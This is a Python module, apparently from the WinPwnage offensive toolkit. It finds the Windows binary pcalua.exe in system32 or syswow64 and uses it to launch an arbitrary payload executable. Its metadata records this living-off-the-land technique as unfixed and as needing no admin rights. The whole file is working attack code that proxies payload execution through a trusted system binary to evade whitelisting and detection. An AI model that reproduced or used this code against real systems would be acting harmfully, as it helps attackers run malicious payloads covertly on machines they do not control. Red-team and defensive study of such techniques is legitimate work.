import os
import random
from winpwnage.core.prints import *
from winpwnage.core.utils import *

#https://lolbas-project.github.io/lolbas/Binaries/Pcalua

pcalua_info = {
	"Description": "Executes payload using the Program Compatibility Assistant",
	"Id": "2",
	"Type": "Execution",
	"Fixed In": "99999",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "exec_pcalua",
	"Function Payload": True,
}


def exec_pcalua(payload):
	if payloads().exe(payload):
		paths = []
		binary = "pcalua.exe"

		print_info("Searching for ({binary}) in system32 and syswow64".format(binary=binary))
		for root, dirs, files in os.walk(information().windows_directory()):	
			for name in files:
				if name.lower() == binary:
					if "system32" in root.lower() or "syswow64" in root.lower():
						paths.append(os.path.join(root, name))

		try:
			path = random.choice(paths)
		except IndexError:
			print_error("Unable to proceed, ({binary}) not found on system".format(binary=binary))
			return False
		else:
			print_info("Located ({binary}) binary".format(binary=binary))
			print_info("Attempting to launch {payload} using ({binary}) binary".format(payload=payload,binary=binary))		
			exit_code = process().create(path,
						params="-a {payload}".format(payload=payload),
						get_exit_code=True)

			if exit_code == 0:
				print_success("Successfully created process ({}) exit code ({})".format(payload, exit_code))
			else:
				print_error("Unable to create process ({}) exit code ({})".format(payload, exit_code))					
				return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False				